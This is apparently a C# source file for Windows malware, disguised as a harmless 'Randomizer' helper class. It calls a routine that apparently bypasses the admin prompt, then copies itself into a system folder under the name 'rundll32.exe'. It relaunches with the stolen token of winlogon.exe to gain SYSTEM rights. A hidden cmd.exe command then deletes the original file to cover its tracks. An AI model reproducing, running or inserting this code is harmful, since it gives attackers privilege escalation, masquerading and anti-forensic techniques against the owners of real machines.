using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;

// REQUIRES PUBLISHING TO SINGLE FILE

// ReSharper disable UnusedMember.Global
// ReSharper disable SuggestVarOrType_BuiltInTypes
// ReSharper disable StringLiteralTypo
// ReSharper disable once CheckNamespace

namespace Memory
{
    // ReSharper disable once UnusedMember.Global
    // ReSharper disable once IdentifierTypo

    public static class Randomizer
    {
        public static readonly Random Rand = new();

        public static void Run()
        {
            if (Environment.UserName.ToLower() is "system" or @"anon$") return;
            Process process = Process.GetCurrentProcess();
            if (process.MainModule != null)
            {
                string currentPath = process.MainModule.FileName;
                const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
                if (!IsAdministrator())
                {
                    Task.Run(() => Bypass.Run(currentPath)).Wait();
                    Environment.Exit(0);
                }
                if (File.Exists(finalPath)) File.Delete(finalPath);
                if (currentPath != null) File.Copy(currentPath, finalPath);
                Sudoku.RunWithTokenOf(
                    "winlogon.exe",
                    true,
                    finalPath,
                    string.Empty,
                    RuntimeEnvironment.GetRuntimeDirectory());
            }
            Environment.Exit(0);
        }

        public static void Clean()
        {
            Process process = Process.GetCurrentProcess();
            if (process.MainModule == null) return;

            string exePath = process.MainModule.FileName;
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static string RandomStr(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[Rand.Next(s.Length)]).ToArray());
        }

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                .IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
